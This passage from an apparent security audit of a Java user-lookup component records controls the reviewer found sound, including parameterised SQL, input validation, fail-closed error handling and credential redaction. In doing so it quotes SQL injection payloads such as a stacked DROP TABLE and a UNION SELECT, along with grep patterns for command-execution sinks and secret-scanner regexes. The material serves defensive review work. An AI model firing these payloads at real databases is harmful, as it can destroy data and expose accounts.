 * Verify with the algorithm's own operation — for bcrypt,
 * {@code BCrypt.checkpw(candidate, stored)} — which re-derives the candidate's hash under the
 * stored salt and cost factor and compares internally. Never compare password material yourself,
 * never hash the candidate under a different salt, and never log this value.
```

If the project standardises on a framework encoder (`BCryptPasswordEncoder.matches`, Argon2, or `MessageDigest.isEqual` *only* for a single-iteration HMAC of both sides), name that exact call instead so the reader has no room to improvise, and add a test asserting a wrong password against a `$2a$10$…` fixture is rejected.

## 6. Verified Controls and Checks With No Finding

Confirmed correct by reading the code and, where the project provides executable evidence, by the test suite. Recorded so absence of a finding is not mistaken for absence of examination.

- **SQL injection is genuinely absent, not merely unlikely.** `SELECT_BY_USERNAME` (`UserRepository.java:30-33`) is a `static final` string built from literals; the username reaches the driver only through `statement.setString(1, canonical)` at `:62`, so the statement is fully parsed and planned before the value exists. I grepped the whole tree for `prepareStatement|createStatement|execute|executeQuery|String.format|formatted|\\+ *\"|concat|StringBuilder` on SQL and found **no** dynamically assembled statement in `src/` — the only `Statement` uses are the entirely static DDL/seed text at `Main.java:155-173` and the test fixtures. `setMaxRows(2)` at `:61` bounds the read.
- **The injection control is pinned structurally, not just behaviourally.** `UserRepositoryTest.statementUsesABoundParameter` (`:240-254`) drives the repository through a `java.lang.reflect.Proxy` connection and asserts three facts the H2 tests cannot see: exactly one statement prepared, the prepared text byte-for-byte equal to the constant (`:251`), the payload absent from that text, and the username delivered *only* as parameter 1 (`:254`). That is the right way to regress this control.
- **Payload coverage is real.** Thirteen payloads (`:100-110`) span tautologies, `--`/`#`/block comments, a column-matched `UNION SELECT` (`:102`), a stacked `'; DROP TABLE users; --` (`:103`), an `IN` list, `1' OR 1=1`, a `'%'='` shape, and lone `%`/`_` wildcards; the suite then re-asserts row count and table existence (`:114-115`) so a partial execution can't pass silently. `%` and `_` are separately confirmed non-patterns, which rules out a `LIKE` predicate masquerading as equality.
- **Boundary validation at the right place, with the right reason.** `normalizeAndValidate` (`:87-108`) enforces non-null, non-blank-after-trim, and a 254-character ceiling matching the column width — the latter rejects 255 and 5,000 characters while accepting 254 as a legitimate non-match, which is a tested boundary rather than an arbitrary cap. Applied at the system boundary, not as a denylist; the comment at `:85` correctly states that binding, not filtering, is what makes the query safe. (The control-character rule's *output-side* gap is SEC-04; the validation itself is sound.)
- **Uniqueness is enforced rather than guessed.** The `ROW_PROBE_LIMIT = 2` read plus the `rows.next()` re-check (`:69-75`) refuses an ambiguous match instead of returning whichever row the engine surfaced first — the right call for an auth-adjacent lookup, and tested with a real duplicate row (`UserRepositoryTest:180-195`), which also asserts the ambiguity is not reported as a driver error.
- **Failure semantics are fail-closed.** `catch (SQLException)` at `:78-79` converts an outage into `UserRepositoryException` rather than an `Optional.empty()`. That matters: an empty result on a broken connection would read as "no such user" and, in a login flow, silently turn an outage into a stream of phantom accounts. `lookupFailureIsNotSilentlyEmpty` (`UserRepositoryTest:203-215`) pins both the preserved `SQLException` cause and the absence of the username from the message.
- **Exception messages carry no input.** Verified across all three throw sites in `UserRepository` and both constructors in `UserRepositoryException`: no message interpolates the username, the SQL text, or driver detail. `UserRepositoryException` also declares `serialVersionUID` (`:13`). (That discipline is undone at one print site — SEC-05 — but the type itself is clean.)
- **Credential redaction in the default string path works and is asserted.** `UserAccount.toString()` omits the hash value (`UserAccount.java:40`), and `toStringRedactsTheCredential` (`UserRepositoryTest:187-191`) asserts both that `[redacted]` appears and that the literal fixture hash does not. The README's mutation table reports the `credential-in-tostring` mutant killed, so the assertion has teeth.
- **No deserialization, command, file, path or RNG sink exists.** Greps across `src/` and `test/` for `ObjectInputStream|readObject|Externalizable|InitialContext|lookup\\(|Runtime.getRuntime|ProcessBuilder|exec\\(|ScriptEngine|FileInputStream|Paths.get|new File|Random\\(|Math.random|MessageDigest|SecretKey|Cipher|MD5|SHA-1|DES\\b|ECB` returned no matches in production code. `UserAccount`'s immutability is real: it is a `record`, with `Objects.requireNonNull` guards on `username` and `status` (`:24-27`) and no mutable collection or array component to leak through the constructor.
- **No hardcoded credentials.** Applying the secret-scanner pattern set (`AKIA[0-9A-Z]{16}`, `-----BEGIN`, `password=`, `passwd`, `secret`, `token`, `api[_-]?key`) across all `*.java` and `README.md` produced no real credential. The only credential-shaped strings are the deliberate `$2a$10$notarealhashvalue` fixtures and the test's `sa`/empty in-memory-H2 login, both of which resolve to throwaway databases. The path is not a git repository, so no committed-history exposure exists to scan.
- **Seed/DDL text is provably input-free.** `seedDemoData` (`Main.java:155-173`) runs only on the in-memory demo path (gated at `:105-107`), contains no concatenation of any variable, and the doubled `o''brien` quote is a correctness demonstration — the companion test (`storedApostropheRoundTrips`, `UserRepositoryTest:141-148`) confirms a stored apostrophe round-trips through binding, which is the case naive escaping breaks.
- **Argument parsing does not mis-attribute input.** The single unnamed positional is captured once and a second one is rejected (`Main.java:72-79`), every flag validates that a value followed it (`:41-46`, `:49-54`, `:56-59`, `:62-65`), and `--help` returns without touching the database. Username-shaped input cannot be mistaken for a flag because the `default` branch rejects anything starting with `-`.
- **No SSRF, path-traversal, XSS, template-injection, or HTTP-header surface.** This component has no HTTP layer, no template engine, no filesystem access, and no URL fetching; the only network destination is the JDBC connection itself, assessed under SEC-02 rather than as a duplicate SSRF finding.
- **DoS surface is proportionate.** The 254-character ceiling and `setMaxRows(2)` bound both input size and result size; the test's 5,000-character input is rejected before any query. I noted and dismissed the absence of pagination as irrelevant to a single-row lookup. `UserAccount.isActive()` (`:29-31`) uses `equalsIgnoreCase` on a stored status with no locale dependence beyond ASCII casing — no `Turkish-I` class issue in practice, and no security decision hinges on it since the caller owns status policy.
